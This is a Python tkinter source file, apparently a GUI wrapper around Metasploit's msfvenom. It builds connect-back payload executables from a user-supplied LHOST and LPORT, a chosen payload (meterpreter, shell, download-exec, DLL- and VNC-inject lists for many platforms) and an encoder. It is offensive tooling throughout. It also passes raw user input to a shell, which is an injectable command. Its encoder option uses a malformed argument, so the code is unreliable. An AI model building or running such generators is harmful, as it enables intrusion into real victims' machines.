import tkinter as tk
from tkinter import ttk, filedialog
import subprocess
import os

def get_payloads_from_files(directory, filenames):
    payloads = []
    for filename in filenames:
        filepath = os.path.join(directory, filename)
        with open(filepath, "r") as file:
            payloads += [line.strip() for line in file.readlines()]
    return sorted(payloads)  # Sort payloads alphabetically

def get_encoders_from_file(encoder_file):
    with open(encoder_file, "r") as file:
        return [line.strip() for line in file.readlines()]

def generate_payload():
    lhost = entry_lhost.get()
    lport = entry_lport.get()
    payload = combo_payload.get()
    encoder = combo_encoder.get()
    output_format = combo_output_format.get() or "exe"
    file_extension = entry_file_extension.get() or "exe"
    output_file = filedialog.asksaveasfilename(defaultextension=f".{file_extension}", filetypes=[("All files", "*.*")])

    msfvenom_command = f"msfvenom -p {payload} ENCODER={encoder} LHOST={lhost} LPORT={lport} -f {output_format} -o {output_file}"
    subprocess.run(msfvenom_command, shell=True)
    result_label.config(text="Payload generated successfully!")

root = tk.Tk()
root.title("MSFvenom Payload Generator")

# Set a background color
root.configure(bg="#303030")

# Custom font
custom_font = ("Arial", 10)

# Add widgets (labels, entry fields, combo boxes, buttons)
label_lhost = tk.Label(root, text="LHOST:", bg="#303030", fg="white", font=custom_font)
label_lhost.pack(pady=5)

entry_lhost = tk.Entry(root, font=custom_font)
entry_lhost.pack(pady=5)

label_lport = tk.Label(root, text="LPORT:", bg="#303030", fg="white", font=custom_font)
label_lport.pack(pady=5)

entry_lport = tk.Entry(root, font=custom_font)
entry_lport.pack(pady=5)

label_payload = tk.Label(root, text="Payload:", bg="#303030", fg="white", font=custom_font)
label_payload.pack(pady=5)

# Directory containing the payload files
payloads_directory = "payloads"

encoders_file = "encoders/encoders.txt"



payload_files = [
    "aix_payloads.txt",
    "android_payloads.txt",
    "apple_payloads.txt",
    "bsd_payloads.txt",
    "cmd_mainframe_payloads.txt",
    "cmd_unix_payloads.txt",
    "cmd_windows_payloads.txt",
    "generic_payloads.txt",
    "java_payloads.txt",
    "linux_aarch64_payloads.txt",
    "linux_armbe_payloads.txt",
    "linux_armle_payloads.txt",
    "linux_misbe_payloads.txt",
    "linux_ppc64_payloads.txt",
    "linux_ppc64le_payloads.txt",
    "linux_ppc_payloads.txt",
    "linux_x64_payloads.txt",
    "linux_x86_payloads.txt",
    "linux_zarch_payloads.txt",
    "mainframe_payloads.txt",
    "multi_payloads.txt",
    "netware_payloads.txt",
    "nodejs_payloads.txt",
    "osx_payloads.txt",
    "php_payloads.txt",
    "python_payloads.txt",
    "r_payloads.txt",
    "ruby_payloads.txt",
    "solaris_payloads.txt",
    "tty_payloads.txt",
    "windows_custom_payloads.txt",
    "windows_dllinject_payloads.txt",
    "windows_dns_payloads.txt",
    "windows_download_exec_payloads.txt",
    "windows_encrypted_shell_payloads.txt",
    "windows_exec_payloads.txt",
    "windows_format_all_payloads.txt",
    "windows_loadlibrary_payloads.txt",
    "windows_messagebox_payloads.txt",
    "windows_meterpreter_payloads.txt",
    "windows_metsvc_payloads.txt",
    "windows_patchup_payloads.txt",
    "windows_peinject_payloads.txt",
    "windows_pingback_payloads.txt",
    "windows_powershell_payloads.txt",
    "windows_speak_pwned_payloads.txt",
    "windows_shell_payloads.txt",
    "windows_upexec_payloads.txt",
    "windows_vncinject_payloads.txt",
    "windows_x64_payloads.txt",
]


encoders = get_encoders_from_file(encoders_file)
payloads = get_payloads_from_files(payloads_directory, payload_files)

combo_payload = ttk.Combobox(root, values=payloads, font=custom_font)
combo_payload.pack(pady=5)

label_encoder = tk.Label(root, text="Encoder:", bg="#303030", fg="white", font=custom_font)
label_encoder.pack(pady=5)

combo_encoder = ttk.Combobox(root, values=encoders, font=custom_font)
combo_encoder.pack(pady=5)

label_output_format = tk.Label(root, text="Output Format:", bg="#303030", fg="white", font=custom_font)
label_output_format.pack(pady=5)

combo_output_format = ttk.Combobox(root, values=["elf", "exe", "macho", "raw"])
combo_output_format.pack()

label_file_extension = tk.Label(root, text="File Extension:")
label_file_extension.pack()
entry_file_extension = tk.Entry(root)
entry_file_extension.pack()

# Use a custom button style
generate_button = tk.Button(root, text="Generate Payload", command=generate_payload, bg="#4CAF50", fg="white", font=custom_font)
generate_button.pack(pady=10)

result_label = tk.Label(root, text="", bg="#303030", fg="white", font=custom_font)
result_label.pack(pady=5)

# Start the GUI event loop
root.mainloop()
